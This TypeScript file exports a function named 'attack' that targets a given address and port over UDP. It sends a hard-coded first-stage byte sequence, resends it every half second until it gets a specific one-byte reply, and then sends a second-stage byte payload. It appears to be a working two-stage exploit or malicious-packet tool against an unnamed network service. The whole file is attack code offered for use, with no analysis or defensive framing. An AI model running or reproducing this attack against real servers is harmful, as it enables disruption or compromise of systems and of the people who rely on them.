import * as dgram from "dgram";
import * as _ from "underscore";

const messageStage1 = [
	1, 2, 0, 42, 49, 127, 0, 0, 1, 0,
	0, 0, 0, 0, 0, 0, 0, 2, 0, 42,
	49, 127, 0, 0, 1, 0, 0, 0, 0, 0,
	0, 0, 0, 109, 44, 0, 0
];

const messageToWait = [3];

const messageStage2 = [
	5, 110, 115, 101, 217, 255, 196, 110, 72, 141, 124, 161,
	146, 49, 52, 114, 149, 16, 0, 1, 0, 40, 0, 0,
	0, 1, 9, 112, 114, 111, 102, 105, 108, 101, 49, 112,
	0, 0, 0, 0, 0, 81, 57, 68, 0, 74, 2, 65,
	8, 0, 0, 0, 0, 0, 0, 0, 0, 51, 1, 0,
	0, 18, 0, 0, 0
];


function sendMessage(socket: any, message: number[]): Promise<any> {
	return new Promise(done => {
		socket.send(Buffer.from(message), done);
	});
}

function waitForReply(socket: any, intervalMessage: number[]): Promise<boolean> {
	const intv = setInterval(sendMessage, 500, socket, intervalMessage);
	return new Promise(done => {
		socket.once("message", (msg: Buffer, rinfo: any) => {
			if (_.isEqual(msg.toJSON().data, messageToWait)) {
				clearInterval(intv);
				done(true);
			}
		});
		setTimeout(() => {
			clearInterval(intv);
			done(false);
		}, 10000);
	});
}

export async function attack(address: string, port: number): Promise<string> {
	const socket = dgram.createSocket("udp4");
	let err;
	err = await new Promise(done => {
		socket.connect(port, address, done);
	});
	if (err) {
		return `Failed to connect: ${err.toString()}`;
	}
	err = await sendMessage(socket, messageStage1);
	if (err) {
		return `Failed to send stage 1: ${err.toString()}`;
	}
	//console.log("Waiting for reply...");
	if (!await waitForReply(socket, messageStage1)) {
		return `Empty reply.`;
	}
	err = await sendMessage(socket, messageStage2);
	if (err) {
		return `Failed to send stage 2: ${err.toString()}`;
	}
	socket.close();
	return null;
}
